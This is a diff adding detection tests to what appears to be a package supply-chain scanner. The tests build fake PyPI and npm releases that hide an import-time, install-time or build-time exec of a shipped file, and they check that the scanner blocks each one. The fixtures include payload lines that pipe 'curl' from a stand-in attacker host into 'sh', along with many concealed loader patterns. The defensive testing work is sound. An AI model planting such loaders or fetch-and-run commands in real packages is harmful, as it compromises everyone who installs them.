@@ -422,3 +422,132 @@ def test_lockfile_integrity_that_the_registry_does_not_serve_blocks(registry):
     )
 
     assert _kinds(report["results"][0], "block") == ["lockfile_artifact_mismatch"]
+
+
+PAYLOAD = "import os\nos.system('curl -s https://evil.example/p | sh')\n"
+FILE_EXEC_HEAD = (
+    "import os, runpy, marshal, json, importlib.util\n"
+    "from importlib.machinery import SourceFileLoader\n"
+    "from pathlib import Path\n"
+    "HERE = os.path.dirname(__file__)\n"
+)
+
+
+def test_import_time_exec_of_a_shipped_file_blocks_and_names_the_file(registry):
+    cases = {
+        "exec(open(os.path.join(os.path.dirname(__file__), '_d.txt')).read())\n": "_d.txt",
+        "p = os.path.join(HERE, '_d.txt')\nexec(compile(open(p).read(), p, 'exec'))\n": "_d.txt",
+        "with open(os.path.join(HERE, '_d.txt')) as f:\n    exec(f.read())\n": "_d.txt",
+        "exec(Path(__file__).with_name('_d.txt').read_text())\n": "_d.txt",
+        "runpy.run_path(os.path.join(HERE, 'x.dat'))\n": "x.dat",
+        "runpy.run_module('{name}._boot')\n": "_boot.py",
+        "SourceFileLoader('x', os.path.join(HERE, 'x.dat')).load_module()\n": "x.dat",
+        (
+            "loader = SourceFileLoader('x', os.path.join(HERE, 'x.dat'))\n"
+            "spec = importlib.util.spec_from_file_location('x', loader.path, loader=loader)\n"
+            "spec.loader.exec_module(importlib.util.module_from_spec(spec))\n"
+        ): "x.dat",
+        "exec(marshal.loads(open(os.path.join(HERE, 'x.bin'), 'rb').read()))\n": "x.bin",
+    }
+    for index, (code, payload) in enumerate(cases.items()):
+        name = f"fx{index}"
+        registry.pypi(name, "1.0", wheel={f"{name}/__init__.py": "VALUE = 1\n"})
+        registry.pypi(
+            name,
+            "1.1",
+            wheel={
+                f"{name}/__init__.py": FILE_EXEC_HEAD + code.replace("{name}", name),
+                f"{name}/{payload}": PAYLOAD,
+            },
+        )
+
+        result, _receipt = _one("pypi", name, "1.0", "1.1")
+
+        assert _kinds(result, "block") == ["new_decode_exec"], code
+        assert f"{name}/{payload}" in result["block"][0]["detail"], code
+
+
+def test_npm_eval_of_a_shipped_file_blocks_at_load_and_install_time(registry):
+    js_payload = "require('child_process').execSync('curl -s https://evil.example/p | sh');\n"
+    cases = [
+        "eval(require('fs').readFileSync(__dirname + '/d.bin', 'utf8'));\n",
+        "const fs = require('fs'), path = require('path');\n"
+        "new Function(fs.readFileSync(path.join(__dirname, 'd.bin'), 'utf8'))();\n",
+        "const vm = require('vm');\n"
+        "vm.runInNewContext(require('fs').readFileSync(`${__dirname}/d.bin`, 'utf8'), {});\n",
+        "const vm = require('vm');\nconst code = require('fs').readFileSync(__dirname + '/d.bin');\n"
+        "new vm.Script(code.toString()).runInThisContext();\n",
+        "const fs = require('fs');\n"
+        "fs.readFile(__dirname + '/d.bin', 'utf8', (err, data) => { module._compile(data, 'x'); });\n",
+    ]
+    for index, code in enumerate(cases):
+        name = f"jx{index}"
+        registry.npm(name, "1.0.0", {"index.js": "module.exports = 1;\n"})
+        registry.npm(name, "1.1.0", {"index.js": code, "d.bin": js_payload})
+
+        result, _receipt = _one("npm", name, "1.0.0", "1.1.0")
+
+        assert "new_decode_exec" in _kinds(result, "block"), code
+        assert "d.bin" in result["block"][0]["detail"], code
+
+    hook = {"scripts": {"postinstall": "node install.js"}}
+    registry.npm("jxi", "1.0.0", {"install.js": "console.log(1);\n"}, manifest=hook)
+    registry.npm(
+        "jxi",
+        "1.1.0",
+        {"install.js": cases[0], "d.bin": js_payload},
+        manifest=hook,
+    )
+    result, _receipt = _one("npm", "jxi", "1.0.0", "1.1.0")
+    assert any(
+        delta["kind"] == "new_decode_exec" and "at install time" in delta["detail"]
+        for delta in result["block"]
+    )
+
+
+def test_payload_swapped_into_an_unchanged_file_loader_blocks_but_data_reads_do_not(registry):
+    loader = FILE_EXEC_HEAD + "exec(open(os.path.join(HERE, '_d.txt')).read())\n"
+    registry.pypi("fs", "1.0", wheel={"fs/__init__.py": loader, "fs/_d.txt": "X = 1\n"})
+    registry.pypi("fs", "1.1", wheel={"fs/__init__.py": loader, "fs/_d.txt": "X = 2\n"})
+    registry.pypi("fs", "1.2", wheel={"fs/__init__.py": loader, "fs/_d.txt": PAYLOAD})
+    data = (
+        FILE_EXEC_HEAD + "CONFIG = json.load(open(os.path.join(HERE, 'c.json')))\nexec('Y = 1')\n"
+    )
+    registry.pypi("fd", "1.0", wheel={"fd/__init__.py": "VALUE = 1\n"})
+    registry.pypi("fd", "1.1", wheel={"fd/__init__.py": data, "fd/c.json": "{}"})
+    registry.npm("jd", "1.0.0", {"index.js": "module.exports = 1;\n"})
+    registry.npm(
+        "jd",
+        "1.1.0",
+        {
+            "index.js": "const fs = require('fs');\n"
+            "module.exports = JSON.parse(fs.readFileSync(__dirname + '/c.json', 'utf8'));\n"
+            "eval('1 + 1');\n",
+            "c.json": "{}",
+        },
+    )
+
+    literal_only, _ = _one("pypi", "fs", "1.0", "1.1")
+    payload, _ = _one("pypi", "fs", "1.0", "1.2")
+    python_data, _ = _one("pypi", "fd", "1.0", "1.1")
+    npm_data, _ = _one("npm", "jd", "1.0.0", "1.1.0")
+
+    assert literal_only["block"] == []
+    assert _kinds(payload, "block") == ["new_decode_exec"]
+    assert python_data["block"] == [] and python_data["warn"] == []
+    assert npm_data["block"] == []
+
+
+def test_build_hook_exec_of_a_shipped_file_judges_that_file(registry):
+    setup = "from setuptools import setup\nexec(open('demo/v.txt').read())\nsetup()\n"
+    base = {"demo/__init__.py": "VALUE = 1\n", "setup.py": setup}
+    registry.pypi("demo", "1.0", sdist={**base, "demo/v.txt": "__version__ = '1.0'\n"})
+    registry.pypi("demo", "1.1", sdist={**base, "demo/v.txt": "__version__ = '1.1'\n"})
+    registry.pypi("demo", "1.2", sdist={**base, "demo/v.txt": PAYLOAD})
+
+    version_bump, _ = _one("pypi", "demo", "1.0", "1.1")
+    payload, _ = _one("pypi", "demo", "1.0", "1.2")
+
+    assert version_bump["block"] == []
+    assert _kinds(payload, "block") == ["new_install_hook"]
+    assert payload["block"][0]["path"] == "demo/v.txt"
